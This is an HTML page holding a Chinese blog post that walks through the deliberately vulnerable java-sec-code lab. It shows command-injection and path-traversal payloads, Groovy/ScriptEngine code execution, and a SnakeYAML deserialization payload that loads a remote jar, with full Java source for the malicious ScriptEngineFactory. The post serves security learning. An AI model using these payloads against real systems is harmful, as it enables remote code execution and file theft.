@@ -1,0 +1,601 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Yu ting">
+  <meta name="keywords" content="">
+  <title>java-sec-code审计（一） - Fearless&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"fearless0923.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Fearless's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="java-sec-code审计（一）">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2024-08-13 08:08" pubdate>
+        August 13, 2024 am
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      20
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">java-sec-code审计（一）</h1>
+            
+            <div class="markdown-body">
+              <p>今天主要用java-sec-code这个靶场过一下常见漏洞。这里用idea搭建。</p>
+<h3 id="0X00-环境搭建"><a class="header-anchor" href="#0X00-环境搭建">🍭</a>0X00 环境搭建</h3>
+<p>java-sec-code使用的框架为springboot，下载到本地后直接使用IDEA导入项目。</p>
+<p>导入项目后需要在本地数据库建立名为java_sec_code的数据库，使用项目文件夹resources下create_db.sql脚本文件建立表和导入数据：</p>
+<p><img src="/2024/08/13/sec/3.png" srcset="/img/loading.gif" alt="3"></p>
+<p>修改resources下的application.properties配置文件：</p>
+<p><img src="/2024/08/13/sec/4.png" srcset="/img/loading.gif" alt="4"></p>
+<p>启动项目显示缺包</p>
+<p><img src="/2024/08/13/sec/1.png" srcset="/img/loading.gif" alt="1"></p>
+<p>需要将项目交给Maven管理，配置JRE和Delegate IDE build/run actions to Maven：</p>
+<p><img src="/2024/08/13/sec/2.png" srcset="/img/loading.gif" alt="2"></p>
+<p>如果项目部署在Windows环境下，需要做如下修改</p>
+<p><img src="/2024/08/13/sec/5.png" srcset="/img/loading.gif" alt="5"></p>
+<p>将filepath指向硬盘的测试文件：</p>
+<p><img src="/2024/08/13/sec/6.png" srcset="/img/loading.gif" alt="6"></p>
+<p>此时运行项目会报错</p>
+<p><img src="/2024/08/13/sec/7.png" srcset="/img/loading.gif" alt="7"></p>
+<p>然后我去网上找了很多解决方法，都没什么用，仔细排查了一下发现没有部署war包</p>
+<p><img src="/2024/08/13/sec/8.png" srcset="/img/loading.gif" alt="8"></p>
+<p>在运行设置里添加上</p>
+<p><img src="/2024/08/13/sec/9.png" srcset="/img/loading.gif" alt="9"></p>
+<p>运行项目成功</p>
+<p><img src="/2024/08/13/sec/10.png" srcset="/img/loading.gif" alt="10"></p>
+<h3 id="0X01-命令注入"><a class="header-anchor" href="#0X01-命令注入">🍭</a>0X01 命令注入</h3>
+<p>源码存在3个方法codeInject、codeInjectHost、codeInjectSec。</p>
+<pre><code class="hljs reasonml">@<span class="hljs-constructor">GetMapping(<span class="hljs-string">&quot;/codeinject&quot;</span>)</span>
+    public String code<span class="hljs-constructor">Inject(String <span class="hljs-params">filepath</span>)</span> throws IOException &#123;
+
+        String<span class="hljs-literal">[]</span> cmdList = <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;dir &quot;</span> + filepath&#125;;
+        ProcessBuilder builder = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ProcessBuilder(<span class="hljs-params">cmdList</span>)</span>;
+        builder.redirect<span class="hljs-constructor">ErrorStream(<span class="hljs-params">true</span>)</span>;
+        Process process = builder.start<span class="hljs-literal">()</span>;
+        return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WebUtils</span>.</span></span>convert<span class="hljs-constructor">StreamToString(<span class="hljs-params">process</span>.<span class="hljs-params">getInputStream</span>()</span>);
+    &#125;
+@<span class="hljs-constructor">GetMapping(<span class="hljs-string">&quot;/codeinject/host&quot;</span>)</span>
+    public String code<span class="hljs-constructor">InjectHost(HttpServletRequest <span class="hljs-params">request</span>)</span> throws IOException &#123;
+
+        String host = request.get<span class="hljs-constructor">Header(<span class="hljs-string">&quot;host&quot;</span>)</span>;
+        logger.info(host);
+        String<span class="hljs-literal">[]</span> cmdList = <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;curl &quot;</span> + host&#125;;
+        ProcessBuilder builder = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ProcessBuilder(<span class="hljs-params">cmdList</span>)</span>;
+        builder.redirect<span class="hljs-constructor">ErrorStream(<span class="hljs-params">true</span>)</span>;
+        Process process = builder.start<span class="hljs-literal">()</span>;
+        return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WebUtils</span>.</span></span>convert<span class="hljs-constructor">StreamToString(<span class="hljs-params">process</span>.<span class="hljs-params">getInputStream</span>()</span>);
+    &#125;
+
+    @<span class="hljs-constructor">GetMapping(<span class="hljs-string">&quot;/codeinject/sec&quot;</span>)</span>
+    public String code<span class="hljs-constructor">InjectSec(String <span class="hljs-params">filepath</span>)</span> throws IOException &#123;
+        String filterFilePath = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SecurityUtil</span>.</span></span>cmd<span class="hljs-constructor">Filter(<span class="hljs-params">filepath</span>)</span>;
+        <span class="hljs-keyword">if</span> (null<span class="hljs-operator"> == </span>filterFilePath) &#123;
+            return <span class="hljs-string">&quot;Bad boy. I got u.&quot;</span>;
+        &#125;
+        String<span class="hljs-literal">[]</span> cmdList = <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;dir &quot;</span> + filterFilePath&#125;;
+        ProcessBuilder builder = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ProcessBuilder(<span class="hljs-params">cmdList</span>)</span>;
+        builder.redirect<span class="hljs-constructor">ErrorStream(<span class="hljs-params">true</span>)</span>;
+        Process process = builder.start<span class="hljs-literal">()</span>;
+        return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WebUtils</span>.</span></span>convert<span class="hljs-constructor">StreamToString(<span class="hljs-params">process</span>.<span class="hljs-params">getInputStream</span>()</span>);
+    &#125;
+&#125;</code></pre>
+<p>codeInject方法中：</p>
+<p>参数filepath没有过滤直接拼接到命令执行数组中，建立ProcessBuilder对象执行新的进程，设置了外部程序和命令参数，通过start()启动了一个外部进程，并且通过getInputStream()读取输出流并将执行结果返回前端，在windows操作系统下使用&amp;符号（&amp;符号需要进行url编码）拼接cmd命令，payload：</p>
+<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span><span class="hljs-regexp">/java_sec_code_war_exploded/</span>codeinject?filepath=%<span class="hljs-number">26</span>ping baidu.com</code></pre>
+<p>拼接后命令为<code>dir &amp;ping baidu.com</code>,执行：</p>
+<p><img src="/2024/08/13/sec/11.png" srcset="/img/loading.gif" alt="11">codeInjectHost方法则是在http请求头中的host进行注入，由于我的tomcat版本过高，高版本的tomcat增加了RFC 7230和RFC 3986对有效字符进行定义，会显示特殊字符无效无法执行命令。</p>
+<p>codeInjectSec使用了SecurityUtil类下的cmdFilter方法对输入的filePath变量进行正则表达式的匹配，只允许出现括号中的字符</p>
+<p><img src="/2024/08/13/sec/12.png" srcset="/img/loading.gif" alt="12"></p>
+<p>白名单相对安全，暂时没有思路来利用这个filepath参数。</p>
+<h3 id="0X02-RCE"><a class="header-anchor" href="#0X02-RCE">🍭</a>0X02 RCE</h3>
+<p>RCE里展示了一些常见的命令执行方式，包括直接使用，、，通过groovyShell进行命令执行。</p>
+<h4 id="Runtime-getRuntime-exec"><a class="header-anchor" href="#Runtime-getRuntime-exec">🍭</a>Runtime.getRuntime().exec()</h4>
+<p><img src="/2024/08/13/sec/13.png" srcset="/img/loading.gif" alt="13"></p>
+<p>传入的cmd参数未经过任何处理</p>
+<p><img src="/2024/08/13/sec/14.png" srcset="/img/loading.gif" alt="14"></p>
+<h4 id="ProcessBuilder"><a class="header-anchor" href="#ProcessBuilder">🍭</a>ProcessBuilder</h4>
+<p><img src="/2024/08/13/sec/15.png" srcset="/img/loading.gif" alt="15"></p>
+<p><code>ProcessBuilder</code>类将<code>arrCmd</code>数组作为参数创建一个新的进程并启动，执行外部命令，并读取该进程的输出。<code>cmd</code>变量一样没做任何限制。</p>
+<h4 id="jscmd"><a class="header-anchor" href="#jscmd">🍭</a>jscmd</h4>
+<p><img src="/2024/08/13/sec/16.png" srcset="/img/loading.gif" alt="16"></p>
+<p>ScriptEngine通过文件扩展名获取js文件，并对文件里的JavaScript代码进行调用，最后eval()执行代码。</p>
+<p>js文件：</p>
+<pre><code class="hljs reasonml">var a = main<span class="hljs-constructor">Output()</span>; 
+<span class="hljs-keyword">function</span> main<span class="hljs-constructor">Output()</span> &#123; 
+    var x=java.lang.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>.exec(<span class="hljs-string">&quot;calc&quot;</span>);
+&#125;</code></pre>
+<p>执行</p>
+<p><img src="/2024/08/13/sec/18.png" srcset="/img/loading.gif" alt="18"></p>
+<h4 id="CVE-2021-36162：通过yaml加载恶意Java对象进行命令执行"><a class="header-anchor" href="#CVE-2021-36162：通过yaml加载恶意Java对象进行命令执行">🍭</a>CVE-2021-36162：通过yaml加载恶意Java对象进行命令执行</h4>
+<p>YAML(YAML Ain’t Markup Language)，又叫YML，是一种人性化的数据序列化的语言，类似于XML，JSON。常做框架的配置文件。</p>
+<p>Apache Dubbo支持通过下发各种类型的规则来进行配置覆盖或流量路由。这些规则被加载到配置中心（例如：ZooKeeper、Nacos等），并由客户在发出请求时检索，以便找到正确的端点。</p>
+<p>在解析这些YAML规则时，Dubbo客户将使用SnakeYAML库加载规则。默认情况下，这些规则将允许调用任意构造函数。有权访问configuration center的攻击者将能够恶意篡改这些规则，因此当使用者读取到来自注册中心的规则时，有可能遭受恶意规则的RCE攻击。源码如下，</p>
+<p><img src="/2024/08/13/sec/17.png" srcset="/img/loading.gif" alt="17"></p>
+<p>yarm方法将传入的参数直接加载，我们可以先触发java.net.URL去拉取远程 HTTP 服务器上的恶意 jar 文件,然后寻找 jar 文件中实现javax.script.ScriptEngineFactory接口的类并实例化，实例化类时执行恶意代码，造成 RCE 漏洞，payload：</p>
+<pre><code class="hljs llvm">/rce/vuln/yarm?content=!<span class="hljs-title">!javax.script.ScriptEngineManager</span><span class="hljs-symbol">%20</span>[!<span class="hljs-title">!java.net.URLClassLoader</span><span class="hljs-symbol">%20</span>[[!<span class="hljs-title">!java.net.URL</span><span class="hljs-symbol">%20</span>[<span class="hljs-symbol">%22</span>http://localhost/yaml-payload.jar<span class="hljs-symbol">%22</span>]]]]</code></pre>
+<p>先将恶意文件编译，再打包成jar：</p>
+<pre><code class="hljs typescript">package artsploit; 
+<span class="hljs-keyword">import</span> javax.script.ScriptEngine; 
+<span class="hljs-keyword">import</span> javax.script.ScriptEngineFactory; 
+<span class="hljs-keyword">import</span> java.io.IOException; 
+<span class="hljs-keyword">import</span> java.util.List; 
+ <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> AwesomeScriptEngineFactory <span class="hljs-keyword">implements</span> ScriptEngineFactory &#123; 
+ <span class="hljs-keyword">public</span> AwesomeScriptEngineFactory() &#123; 
+<span class="hljs-keyword">try</span> &#123; 
+        Runtime.getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>); 
+        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>); 
+    &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123; 
+          e.printStackTrace(); 
+   &#125; 
+&#125; 
+ <span class="hljs-meta">@Override</span> 
+<span class="hljs-keyword">public</span> <span class="hljs-built_in">String</span> getEngineName() &#123; 
+<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; 
+&#125; 
+ <span class="hljs-meta">@Override</span> 
+<span class="hljs-keyword">public</span> <span class="hljs-built_in">String</span> getEngineVersion() &#123; 
+<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; 
+&#125; 
+ <span class="hljs-meta">@Override</span> 
+<span class="hljs-keyword">public</span> List&lt;<span class="hljs-built_in">String</span>&gt; getExtensions() &#123; 
+<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; 
+&#125; 
+ <span class="hljs-meta">@Override</span> 
+<span class="hljs-keyword">public</span> List&lt;<span class="hljs-built_in">String</span>&gt; getMimeTypes() &#123; 
+<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; 
+&#125; 
+ <span class="hljs-meta">@Override</span> 
+<span class="hljs-keyword">public</span> List&lt;<span class="hljs-built_in">String</span>&gt; getNames() &#123; 
+<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; 
+&#125; 
+ <span class="hljs-meta">@Override</span> 
+<span class="hljs-keyword">public</span> <span class="hljs-built_in">String</span> getLanguageName() &#123; 
+<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; 
+&#125; 
+ <span class="hljs-meta">@Override</span> 
+<span class="hljs-keyword">public</span> <span class="hljs-built_in">String</span> getLanguageVersion() &#123; 
+<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; 
+&#125; 
+ <span class="hljs-meta">@Override</span> 
+<span class="hljs-keyword">public</span> <span class="hljs-built_in">Object</span> getParameter(<span class="hljs-built_in">String</span> key) &#123; 
+<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; 
+&#125; 
+ <span class="hljs-meta">@Override</span> 
+<span class="hljs-keyword">public</span> <span class="hljs-built_in">String</span> getMethodCallSyntax(<span class="hljs-built_in">String</span> obj, <span class="hljs-built_in">String</span> m, <span class="hljs-built_in">String</span>... args) &#123; 
+<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; 
+&#125; 
+ <span class="hljs-meta">@Override</span> 
+<span class="hljs-keyword">public</span> <span class="hljs-built_in">String</span> getOutputStatement(<span class="hljs-built_in">String</span> toDisplay) &#123; 
+<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; 
+&#125; 
+ <span class="hljs-meta">@Override</span> 
+<span class="hljs-keyword">public</span> <span class="hljs-built_in">String</span> getProgram(<span class="hljs-built_in">String</span>... statements) &#123; 
+<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; 
+&#125; 
+ <span class="hljs-meta">@Override</span> 
+<span class="hljs-keyword">public</span> ScriptEngine getScriptEngine() &#123; 
+<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; 
+&#125; 
+&#125;</code></pre>
+<p><img src="/2024/08/13/sec/19.png" srcset="/img/loading.gif" alt="19"></p>
+<p>但由于tomcat版本过高，无法成功执行</p>
+<p><img src="/2024/08/13/sec/20.png" srcset="/img/loading.gif" alt="20"></p>
+<h4 id="groovy"><a class="header-anchor" href="#groovy">🍭</a>groovy</h4>
+<p><img src="/2024/08/13/sec/21.png" srcset="/img/loading.gif" alt="21"></p>
+<p>在Java中，<code>GroovyShell</code> 类是 Groovy 语言提供的一个非常强大的工具，它允许在Java程序中动态地执行Groovy脚本。这里参数content可控且无任何处理，我们可以构造Groovy脚本字符串传入执行</p>
+<p><img src="/2024/08/13/sec/22.png" srcset="/img/loading.gif" alt="22"></p>
+<h3 id="Path-traversal"><a class="header-anchor" href="#Path-traversal">🍭</a>Path_traversal</h3>
+<p><img src="/2024/08/13/sec/23.png" srcset="/img/loading.gif" alt="23"></p>
+<p>路径参数未做任何的过滤限制，简单的判断文件是否存在或者是否为目录，读取文件内容全部内容经过base64编码返回前端</p>
+<p><img src="/2024/08/13/sec/24.png" srcset="/img/loading.gif" alt="24"></p>
+<p>Path_traversalsec方法加了一个过滤函数</p>
+<p><img src="/2024/08/13/sec/25.png" srcset="/img/loading.gif" alt="25"></p>
+<p>该函数使用while循环<code>while (temp.indexOf('%') != -1)</code>将传入的参数重复解码，直到字符串中不再包含<code>%</code>字符；此时，就算字符进行了多次URL编码也会被解码回原样。函数还对<code>..</code>,<code>/</code>进行限制。</p>
+<p>但该函数虽然能对<code>../</code>进行限制，但用户从盘符开始还是能读取到数据</p>
+<p><img src="/2024/08/13/sec/26.png" srcset="/img/loading.gif" alt="26"></p>
+<p>Path_traversalsec方法还是不安全。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/07/25/kerr/">
+                        <span class="hidden-mobile">Kerberos协议攻击方式</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
